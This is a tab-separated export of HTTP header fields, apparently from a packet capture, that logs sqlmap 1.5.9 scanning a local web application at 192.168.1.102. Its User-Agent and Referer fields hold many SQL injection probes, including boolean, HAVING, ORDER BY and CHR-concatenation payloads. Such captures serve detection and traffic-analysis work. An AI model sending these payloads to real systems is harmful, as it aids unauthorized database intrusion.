http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org) HAVING 7687=7687# DZtk				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org) HAVING 8520=7408# LSua				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)' HAVING 9954=2701 OR 'bAzT'='ZIqo				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)' HAVING 7687=7687 OR 'XTOf'='rJCU				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)' HAVING 5243=2369 OR 'Cygl'='AMbe				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			(SELECT CONCAT(CONCAT(CHR(113)&CHR(120)&CHR(113)&CHR(118)&CHR(113),(CASE WHEN (3618=3618) THEN CHR(49) ELSE CHR(48) END)),CHR(113)&CHR(106)&CHR(118)&CHR(98)&CHR(113)))				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-6442) ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-4568) ORDER BY 8476%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-1854' ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-1050' ORDER BY 6153%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-8531) ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-5705) ORDER BY 2573%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-9762)) ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-6938)) ORDER BY 3788%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-8839))) ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-6316))) ORDER BY 6742%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-1266 ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-2116 ORDER BY 9387%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-4457') ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-6278') ORDER BY 2482%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-6317')) ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-1290')) ORDER BY 5295%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-8373'))) ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-6629'))) ORDER BY 4574%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-6455' ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-1760' ORDER BY 5521%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-3481') ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-3205') ORDER BY 5076%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-6477')) ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-9869')) ORDER BY 7816%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-3132%' ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-8568%' ORDER BY 3189%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-4608' ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-3545' ORDER BY 9633%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-7730") ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-5475") ORDER BY 6951%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-1228")) ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-4327")) ORDER BY 5920%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-2029" ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-2584" ORDER BY 5868%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-2478") ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-2659") ORDER BY 9445%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-2569" ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-1735" ORDER BY 9210%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-9102 ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-8508 ORDER BY 3364%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-9923 ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-3761 ORDER BY 3237%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-1501' ORDER BY 1%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			-7646' ORDER BY 1561%16				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														2426	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/()(.'"),,.	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/'LLbIBM<'">XrgewN	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/) AND 6470=6899-- oSNI	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/) AND 2335=2335-- zSrn	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/) AND 4919=5614-- DYMx	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/' AND 2044=8281-- bJFy	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/' AND 2335=2335-- kous	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/' AND 7423=3626-- QBAS	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/) AND 8278=8021 AND (9153=9153	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/) AND 2335=2335 AND (1423=1423	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/) AND 6036=9812 AND (8186=8186	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/)) AND 6906=3430 AND ((4717=4717	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/)) AND 2335=2335 AND ((3885=3885	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/)) AND 1452=5562 AND ((7491=7491	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/))) AND 4493=6089 AND (((2339=2339	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/))) AND 2335=2335 AND (((4187=4187	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/))) AND 1723=4480 AND (((2770=2770	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/ AND 8436=8113	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/ AND 2335=2335	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/ AND 5864=5240	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/') AND 1672=3401 AND ('ZPIc'='ZPIc	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/') AND 2335=2335 AND ('fWTF'='fWTF	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/') AND 4459=6052 AND ('ljhd'='ljhd	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/')) AND 9057=9735 AND (('wqRj'='wqRj	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/')) AND 2335=2335 AND (('Dxou'='Dxou	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/')) AND 8706=3566 AND (('fWwi'='fWwi	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/'))) AND 1934=1292 AND ((('QUAY'='QUAY	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/'))) AND 2335=2335 AND ((('qXks'='qXks	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/'))) AND 1514=2194 AND ((('zsKq'='zsKq	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/' AND 4557=3590 AND 'TyhN'='TyhN	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/' AND 2335=2335 AND 'VSRC'='VSRC	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/' AND 7375=2724 AND 'DLHO'='DLHO	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/') AND 5938=4860 AND ('tlzz' LIKE 'tlzz	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/') AND 2335=2335 AND ('JaQz' LIKE 'JaQz	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/') AND 8087=2712 AND ('bLwb' LIKE 'bLwb	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
